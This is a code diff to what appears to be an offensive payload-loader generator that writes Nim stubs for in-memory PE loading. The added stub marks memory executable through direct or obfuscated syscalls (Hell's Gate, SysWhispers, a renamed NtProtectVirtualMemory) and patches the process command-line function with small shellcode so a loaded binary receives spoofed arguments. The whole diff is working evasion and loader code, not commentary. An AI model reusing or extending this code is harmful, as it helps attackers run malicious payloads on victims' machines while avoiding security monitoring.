@@ -488,8 +488,9 @@ when defined(args):
         var oldProtect: DWORD = 0
         var lpAddress = targetAddr
         var dwSize = cast[SIZE_T](len(data))
+        var hProcess = MyGetCurrentProcess()
         success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
-        copyMem(targetAddr, unsafeAddr data[0], len(data))
+        copyMem(lpAddress, unsafeAddr data[0], len(data))
         success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
 when defined(args):
     proc patchArgFunctionMemory*(funcAddr: pointer, pNewCommandLine: pointer): void =
@@ -502,6 +503,29 @@ when defined(args):
         shellcode.add(byte(0xc3)) # ret
         patchMemory(funcAddr, shellcode)
 """
+let WhispersPatchargsFuncs = fmt"""
+var arguments: string = "{arguments}"
+when defined(args):
+    proc patchMemory*(targetAddr: PVOID, data: openArray[byte]): void =
+        var oldProtect: DWORD = 0
+        var lpAddress = targetAddr
+        var dwSize = cast[SIZE_T](len(data))
+        var hProcess = MyGetCurrentProcess()
+        success =  uashdiasdj(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
+        copyMem(targetAddr, unsafeAddr data[0], len(data))
+        success =  uashdiasdj(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
+when defined(args):
+    proc patchArgFunctionMemory*(funcAddr: pointer, pNewCommandLine: pointer): void =
+        when defined x86:
+            var shellcode: seq[byte] = @[byte(0xb8)] # movabs rax, new_cmd
+        else:
+            var shellcode: seq[byte] = @[byte(0x48), byte(0xb8)] # movabs rax, new_cmd
+        for t in cast[array[sizeOf(pointer), byte]](pNewCommandLine):
+            shellcode.add t        
+        shellcode.add(byte(0xc3)) # ret
+        patchMemory(funcAddr, shellcode)
+"""
+
 let RemoteProcImportStub = """
 import osproc
 """
@@ -989,17 +1013,21 @@ if(dll_out):
             stub = stub.replace("FUNC_EXPORT", f)
 
 if (peload):
-    if (embeddedArguments):
-        stub.add(PatchargsFuncs)
     if (localinject):
         if (hellsgate):
+            if (embeddedArguments):
+                stub.add(PatchargsFuncs)
             stub.add(HellsgateAllocDelegate)
             stub.add(HellsPELoadStub)
         elif(getfreshstub):
+            if (embeddedArguments):
+                stub.add(PatchargsFuncs)
             stub.add(NtAllocateVirtualMemoryDelegate)
             stub.add(ProtectWriteAllocSyscalls)
             stub.add(PELoadStub)
         elif(syswhispers):
+            if (embeddedArguments):
+                stub.add(WhispersPatchargsFuncs)
             stub.add(WhispersPELoadStub)
     else:   
         stub.add(RemoteProcImportStub)
